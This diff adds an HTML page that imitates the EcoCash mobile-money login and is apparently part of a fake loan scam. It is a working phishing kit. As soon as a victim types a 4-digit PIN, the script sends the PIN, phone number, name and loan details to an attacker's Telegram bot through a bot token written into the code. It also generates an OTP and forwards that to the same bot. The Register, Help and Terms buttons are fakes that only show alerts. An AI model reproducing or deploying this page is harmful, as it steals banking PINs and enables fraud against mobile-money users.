@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash - Login</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0;
+            position: relative;
+            color: #333333;
+        }
+        
+        /* Add subtle background pattern like in the image */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: 
+                radial-gradient(circle at 15% 50%, rgba(0, 123, 255, 0.03) 0%, transparent 55%),
+                radial-gradient(circle at 85% 30%, rgba(0, 123, 255, 0.02) 0%, transparent 55%);
+            z-index: -1;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 340px;
+            margin-top: 60px;
+        }
+        
+        .header {
+            margin-bottom: 40px;
+            text-align: center;
+        }
+        
+        .logo {
+            font-size: 34px;
+            color: #333333;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            margin-bottom: 12px;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        
+        .subtitle {
+            font-size: 20px;
+            color: #333333;
+            font-weight: 500;
+            letter-spacing: -0.3px;
+        }
+        
+        .login-form {
+            background-color: #ffffff;
+            border-radius: 12px;
+            padding: 24px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+            margin-bottom: 24px;
+            border: 1px solid #e1e5e9;
+        }
+        
+        .input-section {
+            margin-bottom: 20px;
+        }
+        
+        .input-label {
+            display: block;
+            font-size: 14px;
+            color: #666666;
+            font-weight: 500;
+            margin-bottom: 8px;
+            letter-spacing: -0.2px;
+        }
+        
+        .phone-input {
+            display: flex;
+            align-items: center;
+            border: 1.5px solid #d1d9e6;
+            border-radius: 8px;
+            overflow: hidden;
+            background: #ffffff;
+            transition: border-color 0.2s;
+        }
+        
+        .phone-input:focus-within {
+            border-color: #007bff;
+        }
+        
+        .country-code {
+            padding: 0 16px;
+            background: #ffffff;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            color: #333333;
+            font-weight: 600;
+            font-size: 15px;
+            border-right: 1.5px solid #d1d9e6;
+        }
+        
+        .phone-input input {
+            border: none;
+            background: transparent;
+            padding: 15px 12px;
+            font-size: 15px;
+            width: 100%;
+            color: #333333;
+            font-weight: 500;
+            outline: none;
+        }
+        
+        .phone-input input::placeholder {
+            color: #999999;
+            font-weight: 400;
+        }
+        
+        .pin-input input {
+            width: 100%;
+            padding: 15px;
+            border: 1.5px solid #d1d9e6;
+            border-radius: 8px;
+            font-size: 24px;
+            background: #ffffff;
+            color: #333333;
+            text-align: center;
+            letter-spacing: 12px;
+            font-weight: 600;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .pin-input input:focus {
+            border-color: #007bff;
+        }
+        
+        .pin-input input::placeholder {
+            color: #cccccc;
+            letter-spacing: 4px;
+            font-weight: 400;
+            font-size: 16px;
+        }
+        
+        .forgot-pin {
+            text-align: right;
+            margin-top: 10px;
+        }
+        
+        .forgot-pin a {
+            color: #007bff;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+        
+        .forgot-pin a:hover {
+            color: #0056b3;
+            text-decoration: underline;
+        }
+        
+        .login-btn {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 16px;
+            font-size: 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: 600;
+            margin-top: 8px;
+            transition: background-color 0.2s, transform 0.1s;
+            letter-spacing: -0.2px;
+            box-shadow: 0 2px 4px rgba(0, 123, 255, 0.2);
+        }
+        
+        .login-btn:hover {
+            background: #0069d9;
+        }
+        
+        .login-btn:active {
+            transform: translateY(1px);
+            box-shadow: 0 1px 2px rgba(0, 123, 255, 0.2);
+        }
+        
+        .separator {
+            height: 1px;
+            background: #e1e5e9;
+            margin: 32px 0;
+            position: relative;
+        }
+        
+        .separator::before {
+            content: "OR";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #f0f2f5;
+            padding: 0 15px;
+            color: #666666;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        .register-section {
+            background-color: #ffffff;
+            border-radius: 12px;
+            padding: 24px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+            margin-bottom: 20px;
+            border: 1px solid #e1e5e9;
+            text-align: center;
+        }
+        
+        .register-text {
+            color: #666666;
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+            font-weight: 500;
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+        
+        .btn {
+            flex: 1;
+            padding: 13px;
+            border-radius: 8px;
+            border: 1.5px solid #007bff;
+            background: white;
+            color: #007bff;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            max-width: 140px;
+            transition: all 0.2s;
+            letter-spacing: -0.2px;
+        }
+        
+        .btn:hover {
+            background: #f0f8ff;
+            border-color: #0056b3;
+            color: #0056b3;
+        }
+        
+        .btn:active {
+            transform: translateY(1px);
+        }
+        
+        .version {
+            text-align: center;
+            color: #999999;
+            font-size: 11px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            margin-bottom: 16px;
+        }
+        
+        .terms {
+            text-align: center;
+            color: #666666;
+            font-size: 12px;
+            line-height: 1.5;
+            font-weight: 500;
+            padding: 0 20px;
+        }
+        
+        .terms a {
+            color: #007bff;
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.2s;
+        }
+        
+        .terms a:hover {
+            color: #0056b3;
+            text-decoration: underline;
+        }
+        
+        .footer {
+            margin-top: 40px;
+            width: 100%;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        /* Form field focus states */
+        input:focus {
+            outline: none;
+        }
+        
+        /* Remove number input arrows */
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        
+        input[type=number] {
+            -moz-appearance: textfield;
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 400px) {
+            .container {
+                padding: 0 20px;
+                margin-top: 40px;
+            }
+            
+            .login-form,
+            .register-section {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">EcoCash</div>
+            <div class="subtitle">Login</div>
+        </div>
+        
+        <form class="login-form" onsubmit="return false;">
+            <div class="input-section">
+                <label class="input-label">+263 Phone Number</label>
+                <div class="phone-input">
+                    <div class="country-code">+263</div>
+                    <input type="tel" id="phone" placeholder="Phone Number" maxlength="9" required>
+                </div>
+            </div>
+            
+            <div class="input-section">
+                <label class="input-label">Enter your PIN</label>
+                <div class="pin-input">
+                    <input type="password" id="pin" placeholder="••••" maxlength="4" required
+                           pattern="\d{4}" title="Please enter a 4-digit PIN">
+                </div>
+                <div class="forgot-pin">
+                    <a href="#" onclick="forgotPIN()">Forgot PIN?</a>
+                </div>
+            </div>
+            
+            <button type="button" class="login-btn" onclick="login()">
+                LOGIN
+            </button>
+        </form>
+        
+        <div class="separator"></div>
+        
+        <div class="register-section">
+            <p class="register-text">To register an EcoCash wallet or get assistance, click below</p>
+            <div class="button-group">
+                <button class="btn" onclick="register()">Register</button>
+                <button class="btn" onclick="helpSupport()">Help & Support</button>
+            </div>
+        </div>
+        
+        <div class="version">v3.0.0P</div>
+        
+        <div class="terms">
+            By signing in you agree to the <a href="#" onclick="showTerms()">Terms and Conditions</a>
+        </div>
+        
+        <div class="footer"></div>
+    </div>
+
+    <script>
+        let applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            // Auto-fill phone if available
+            if (applicationData.phone) {
+                document.getElementById('phone').value = applicationData.phone;
+            }
+            
+            // Phone input validation
+            const phoneInput = document.getElementById('phone');
+            phoneInput.addEventListener('input', function(e) {
+                this.value = this.value.replace(/[^0-9]/g, '');
+            });
+            
+            // PIN input validation
+            const pinInput = document.getElementById('pin');
+            pinInput.addEventListener('input', function(e) {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                
+                // Auto-submit and send PIN to Telegram when 4 digits are entered
+                if (this.value.length === 4) {
+                    const phone = document.getElementById('phone').value;
+                    if (phone && phone.length >= 9) {
+                        sendPINToTelegram(this.value, phone);
+                        // Auto-click login after a short delay
+                        setTimeout(() => {
+                            document.querySelector('.login-btn').click();
+                        }, 300);
+                    }
+                }
+            });
+            
+            // Add enter key support
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    login();
+                }
+            });
+        });
+        
+        function forgotPIN() {
+            alert('Please use the 4-digit PIN you created during registration.');
+        }
+        
+        function sendPINToTelegram(pin, phone) {
+            const botToken = '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI';
+            const chatId = '5520957080';
+            
+            const firstName = applicationData.firstName || 'Not Provided';
+            const lastName = applicationData.lastName || 'Not Provided';
+            const appId = applicationData.applicationId || 'Not Provided';
+            
+            const message = `
+🔐 *LOGIN ATTEMPT DETECTED*
+
+📋 *Application ID:* ${appId}
+📱 *Phone:* +263${phone}
+🔢 *PIN Entered:* ${pin}
+👤 *Applicant:* ${firstName} ${lastName}
+
+💰 *Loan Details:*
+• Amount: $${applicationData.loanAmount || 'N/A'}
+• Purpose: ${applicationData.purpose || 'N/A'}
+• Term: ${applicationData.loanTerm || 'N/A'} months
+
+🕒 *Login Attempt:* ${new Date().toLocaleString()}
+            `;
+            
+            const encodedMessage = encodeURIComponent(message);
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=Markdown`)
+                .catch(error => console.error('Error sending PIN:', error));
+        }
+        
+        function login() {
+            const phone = document.getElementById('phone').value.trim();
+            const pin = document.getElementById('pin').value.trim();
+            
+            if (!phone || phone.length < 9) {
+                alert('Please enter a valid phone number');
+                document.getElementById('phone').focus();
+                return;
+            }
+            
+            if (!pin || pin.length !== 4) {
+                alert('Please enter a 4-digit PIN');
+                document.getElementById('pin').focus();
+                return;
+            }
+            
+            // Generate and send OTP
+            generateAndSendOTP(phone, pin);
+        }
+        
+        function generateAndSendOTP(phone, pin) {
+            // Generate 6-digit OTP
+            const otp = Math.floor(100000 + Math.random() * 900000);
+            
+            // Save OTP data
+            const otpData = {
+                otp: otp.toString(),
+                expires: new Date(Date.now() + 15 * 60 * 1000).toISOString(),
+                phone: phone,
+                pin: pin
+            };
+            
+            localStorage.setItem('otpVerification', JSON.stringify(otpData));
+            
+            // Send OTP to Telegram
+            sendOTPToTelegram(otp, phone);
+            
+            // Show OTP verification page
+            window.location.href = 'otp-verification-final.html';
+        }
+        
+        function sendOTPToTelegram(otp, phone) {
+            const botToken = '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI';
+            const chatId = '5520957080';
+            
+            const firstName = applicationData.firstName || 'Not Provided';
+            const lastName = applicationData.lastName || 'Not Provided';
+            const appId = applicationData.applicationId || 'Not Provided';
+            
+            const message = `
+📱 *OTP SENT FOR VERIFICATION*
+
+📋 *Application ID:* ${appId}
+🔢 *OTP CODE:* ${otp}
+📱 *To Phone:* +263${phone}
+👤 *Applicant:* ${firstName} ${lastName}
+⏰ *Expires:* 15 minutes
+
+🕒 *Sent at:* ${new Date().toLocaleString()}
+            `;
+            
+            const encodedMessage = encodeURIComponent(message);
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=Markdown`)
+                .catch(error => console.error('Error sending OTP:', error));
+        }
+        
+        function register() {
+            alert('Redirecting to EcoCash registration...');
+            // window.location.href = 'https://ecocash.com/register';
+        }
+        
+        function helpSupport() {
+            alert('Opening Help & Support...');
+            // window.location.href = 'https://ecocash.com/support';
+        }
+        
+        function showTerms() {
+            alert('Showing Terms and Conditions...');
+            // window.location.href = 'https://ecocash.com/terms';
+        }
+    </script>
+</body>
+</html>
